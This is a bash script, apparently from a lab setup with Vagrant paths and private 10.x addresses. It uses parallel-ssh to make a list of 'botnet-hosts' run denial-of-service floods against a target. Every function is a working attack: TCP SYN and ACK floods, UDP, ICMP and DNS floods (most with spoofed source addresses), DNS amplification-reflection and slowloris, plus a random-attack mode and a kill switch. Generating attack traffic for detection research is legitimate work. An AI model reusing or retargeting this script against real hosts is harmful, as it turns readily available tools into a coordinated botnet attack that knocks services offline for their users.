#!/bin/bash

MYARG=$1

tcp-syn-flood () {
	parallel-ssh -t 300 -h botnet-hosts sudo hping3 -q -S --flood --rand-source -p 80 10.10.10.10 >/dev/null 2>&1
}

tcp-syn-flood-unspoofed () {
	parallel-ssh -t 300 -h botnet-hosts sudo hping3 -q -S --flood -p 80 10.10.10.10 >/dev/null 2>&1
}

tcp-ack-flood () {
	parallel-ssh -t 300 -h botnet-hosts sudo hping3 -q -A --flood --rand-source -p 80 10.10.10.10 >/dev/null 2>&1
}

tcp-ack-flood-unspoofed () {
	parallel-ssh -t 300 -h botnet-hosts sudo hping3 -q -A --flood -p 80 10.10.10.10 >/dev/null 2>&1
}

udp-flood () {
	parallel-ssh -t 300 -h botnet-hosts sudo hping3 -q --udp --flood --rand-source -p 80 10.10.10.10 >/dev/null 2>&1
}

udp-flood-unspoofed () {
	parallel-ssh -t 300 -h botnet-hosts sudo hping3 -q --udp --flood -p 80 10.10.10.10 >/dev/null 2>&1
}

icmp-flood () {
	parallel-ssh -t 300 -h botnet-hosts sudo hping3 -q --icmp --flood --rand-source 10.10.10.10 >/dev/null 2>&1
}

icmp-flood-unspoofed () {
	parallel-ssh -t 300 -h botnet-hosts sudo hping3 -q --icmp --flood 10.10.10.10 >/dev/null 2>&1
}

dns-flood () {
	parallel-ssh -t 300 -h botnet-hosts sudo /home/vagrant/dns-flood/dnsflood ddos.com -r --src-port 80 10.10.10.11 >/dev/null 2>&1
}

dns-flood-unspoofed () {
	parallel-ssh -t 300 -h botnet-hosts sudo /home/vagrant/dns-flood/dnsflood ddos.com --src-port 80 10.10.10.11 >/dev/null 2>&1
}

dns-amplification-reflection () {
	parallel-ssh -t 300 -h botnet-hosts sudo /home/vagrant/dns-flood/dnsflood amplification.com -s 10.10.10.10 --src-port 68 10.10.10.11 >/dev/null 2>&1
}

slowloris () {
	parallel-ssh -t 300 -h botnet-hosts slowloris --sleeptime 1 -s 300 10.10.10.10 >/dev/null 2>&1
}

if [ $MYARG = "tcp-syn-flood" ]
then
	tcp-syn-flood
elif [ $MYARG = "tcp-syn-flood-unspoofed" ]
then
	tcp-syn-flood-unspoofed
elif [ $MYARG = "tcp-ack-flood" ]
then
	tcp-ack-flood
elif [ $MYARG = "tcp-ack-flood-unspoofed" ]
then
	tcp-ack-flood-unspoofed
elif [ $MYARG = "udp-flood" ]
then
	udp-flood
elif [ $MYARG = "udp-flood-unspoofed" ]
then
	udp-flood-unspoofed
elif [ $MYARG = "icmp-flood" ]
then
	icmp-flood
elif [ $MYARG = "icmp-flood-unspoofed" ]
then
	icmp-flood-unspoofed
elif [ $MYARG = "dns-flood" ]
then
	dns-flood
elif [ $MYARG = "dns-flood-unspoofed" ]
then
	dns-flood-unspoofed
elif [ $MYARG = "dns-reflection" ]
then
	dns-amplification-reflection
elif [ $MYARG = "slowloris" ]
then
	slowloris
elif [ $MYARG = "random" ]
then
	RANDOMDDOS=$((1 + $RANDOM % 7))
	if [ $RANDOMDDOS -eq 1 ]
	then
		tcp-syn-flood
	elif [ $RANDOMDDOS -eq 2 ]
	then
		tcp-ack-flood
	elif [ $RANDOMDDOS -eq 3 ]
	then
		udp-flood
	elif [ $RANDOMDDOS -eq 4 ]
	then
		icmp-flood
	elif [ $RANDOMDDOS -eq 5 ]
	then
		dns-flood
	elif [ $RANDOMDDOS -eq 6 ]
	then
		dns-amplification-reflection
	elif [ $RANDOMDDOS -eq 7 ]
	then
		slowloris
	fi
elif [ $MYARG = "kill" ]
then
	parallel-ssh -h botnet-hosts sudo pkill hping3 >/dev/null 2>&1
	parallel-ssh -h botnet-hosts sudo pkill dnsflood >/dev/null 2>&1
	parallel-ssh -h botnet-hosts sudo pkill slowloris >/dev/null 2>&1
elif [ $MYARG = "unknown-ddos" ]
then
	tcp-syn-flood-unspoofed
elif [ $MYARG = "unknown-ddos-2" ]
then
	tcp-syn-flood
elif [ $MYARG = "unknown-ddos-3" ]
then
	dns-flood-unspoofed
else
	echo -n "nespravny argument"
fi